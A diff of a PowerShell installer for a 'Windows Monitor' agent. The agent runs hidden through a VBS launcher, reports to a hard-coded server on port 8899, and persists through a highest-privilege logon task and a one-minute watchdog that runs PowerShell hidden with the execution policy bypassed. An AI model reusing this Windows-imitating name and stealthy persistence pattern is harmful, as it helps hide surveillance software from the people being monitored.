@@ -12,12 +12,10 @@ $script:ProductName = "Windows Monitor"
 $script:ProcessName = "WindowsMonitor"
 $script:MainTaskName = "Windows Monitor"
 $script:WatchdogTaskName = "Windows Monitor Watchdog"
-$script:ServerHost = "108.187.15.71"
+$script:ServerHost = "192.168.61.133"
 $script:ServerPort = "8899"
 $script:InstallDir = Join-Path $env:ProgramData "Windows Monitor"
 $script:UserDataDir = Join-Path $env:LOCALAPPDATA "Windows Monitor"
-$script:LegacyUserDataDir = Join-Path $env:LOCALAPPDATA "MonitorAgent"
-$script:LegacyLauncherPath = Join-Path $script:LegacyUserDataDir "run-hidden.vbs"
 $script:InstallExe = Join-Path $script:InstallDir "$script:ProcessName.exe"
 $script:SourceExe = Join-Path (Split-Path -Parent $MyInvocation.MyCommand.Path) "monitor-agent.exe"
 $script:LauncherPath = Join-Path $script:InstallDir "run-hidden.vbs"
@@ -31,24 +29,6 @@ function Write-InstallLog {
     New-Item -ItemType Directory -Force -Path $script:LogDir | Out-Null
     $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
     Add-Content -Path $script:LogPath -Value $line -Encoding UTF8
-}
-
-function Invoke-NativeQuiet {
-    param(
-        [Parameter(Mandatory=$true)][string]$FilePath,
-        [Parameter(Mandatory=$true)][string[]]$Arguments
-    )
-    $oldPreference = $ErrorActionPreference
-    try {
-        $ErrorActionPreference = "Continue"
-        $output = & $FilePath @Arguments 2>&1
-        return @{
-            ExitCode = $LASTEXITCODE
-            Output = (($output | Out-String).Trim())
-        }
-    } finally {
-        $ErrorActionPreference = $oldPreference
-    }
 }
 
 function Assert-Admin {
@@ -84,34 +64,10 @@ function Stop-AgentProcesses {
     }
 }
 
-function Test-ScheduledTaskExists {
-    param([string]$TaskName)
-    $result = Invoke-NativeQuiet "schtasks.exe" @("/Query", "/TN", $TaskName)
-    return $result.ExitCode -eq 0
-}
-
-function Write-LegacyNoopLauncher {
-    New-Item -ItemType Directory -Force -Path $script:LegacyUserDataDir | Out-Null
-    $content = @"
-' Legacy MonitorAgent task fallback.
-' The old scheduled task could not be deleted, so this file exits quietly.
-WScript.Quit 0
-"@
-    Set-Content -Path $script:LegacyLauncherPath -Value $content -Encoding ASCII
-    Write-InstallLog "旧版 MonitorAgent 任务仍存在，已写入静默占位 VBS: $script:LegacyLauncherPath"
-}
-
 function Remove-OldTasksAndService {
     foreach ($task in @($script:MainTaskName, $script:WatchdogTaskName, "MonitorAgent")) {
-        Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $task) | Out-Null
-        Invoke-NativeQuiet "schtasks.exe" @("/Delete", "/TN", $task, "/F") | Out-Null
-    }
-
-    if (Test-ScheduledTaskExists "MonitorAgent") {
-        Write-LegacyNoopLauncher
-    } elseif (Test-Path $script:LegacyUserDataDir) {
-        Remove-Item -LiteralPath $script:LegacyUserDataDir -Recurse -Force -ErrorAction SilentlyContinue
-        Write-InstallLog "已清理旧版本地目录: $script:LegacyUserDataDir"
+        & schtasks.exe /End /TN $task 2>&1 | Out-Null
+        & schtasks.exe /Delete /TN $task /F 2>&1 | Out-Null
     }
 
     $svc = Get-Service -Name "MonitorAgent" -ErrorAction SilentlyContinue
@@ -121,7 +77,7 @@ function Remove-OldTasksAndService {
                 Stop-Service -Name "MonitorAgent" -Force -ErrorAction SilentlyContinue
                 Start-Sleep -Seconds 1
             }
-            Invoke-NativeQuiet "sc.exe" @("delete", "MonitorAgent") | Out-Null
+            & sc.exe delete MonitorAgent 2>&1 | Out-Null
             Write-InstallLog "已清理旧 Windows 服务"
         } catch {
             Write-InstallLog "清理旧 Windows 服务失败: $($_.Exception.Message)"
@@ -185,29 +141,20 @@ function New-MonitorTasks {
     $mainAction = "wscript.exe `"$script:LauncherPath`""
     $watchdogAction = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:WatchdogPath`""
 
-    $mainOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:MainTaskName, "/TR", $mainAction, "/SC", "ONLOGON", "/RL", "HIGHEST", "/IT", "/F")
-    if ($mainOut.ExitCode -ne 0) {
-        throw "创建登录启动任务失败：$($mainOut.Output)"
+    $mainOut = & schtasks.exe /Create /TN $script:MainTaskName /TR $mainAction /SC ONLOGON /RL HIGHEST /F 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "创建登录启动任务失败：$($mainOut | Out-String)"
     }
 
-    $watchOut = Invoke-NativeQuiet "schtasks.exe" @("/Create", "/TN", $script:WatchdogTaskName, "/TR", $watchdogAction, "/SC", "MINUTE", "/MO", "1", "/RL", "HIGHEST", "/IT", "/F")
-    if ($watchOut.ExitCode -ne 0) {
-        throw "创建自恢复任务失败：$($watchOut.Output)"
+    $watchOut = & schtasks.exe /Create /TN $script:WatchdogTaskName /TR $watchdogAction /SC MINUTE /MO 1 /RL HIGHEST /F 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "创建自恢复任务失败：$($watchOut | Out-String)"
     }
 }
 
 function Start-Monitor {
-    $runOut = Invoke-NativeQuiet "schtasks.exe" @("/Run", "/TN", $script:MainTaskName)
-    if ($runOut.ExitCode -ne 0) {
-        Write-InstallLog "计划任务启动失败，改为直接启动: $($runOut.Output)"
-    }
-    Start-Sleep -Seconds 3
-    $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
-    if (-not $proc) {
-        Write-InstallLog "计划任务未拉起进程，改为直接启动隐藏启动器"
-        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$script:LauncherPath`"" -WindowStyle Hidden
-        Start-Sleep -Seconds 3
-    }
+    & schtasks.exe /Run /TN $script:MainTaskName 2>&1 | Out-Null
+    Start-Sleep -Seconds 2
     $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
     if (-not $proc) {
         throw "$script:ProcessName.exe 没有运行。请查看日志：$script:LogPath"
@@ -252,12 +199,7 @@ function Remove-Agent {
 function Show-Status {
     $tasks = @($script:MainTaskName, $script:WatchdogTaskName)
     foreach ($task in $tasks) {
-        $result = Invoke-NativeQuiet "schtasks.exe" @("/Query", "/TN", $task)
-        if ($result.ExitCode -eq 0) {
-            Write-Host $result.Output
-        } else {
-            Write-Host "$task 未注册"
-        }
+        & schtasks.exe /Query /TN $task 2>&1
     }
     $proc = Get-Process -Name $script:ProcessName -ErrorAction SilentlyContinue
     if ($proc) {
@@ -275,7 +217,7 @@ try {
     }
     if ($Stop) {
         Assert-Admin
-        Invoke-NativeQuiet "schtasks.exe" @("/End", "/TN", $script:MainTaskName) | Out-Null
+        & schtasks.exe /End /TN $script:MainTaskName 2>&1 | Out-Null
         Stop-AgentProcesses
         Write-Host "$script:ProductName 已停止。"
         exit 0
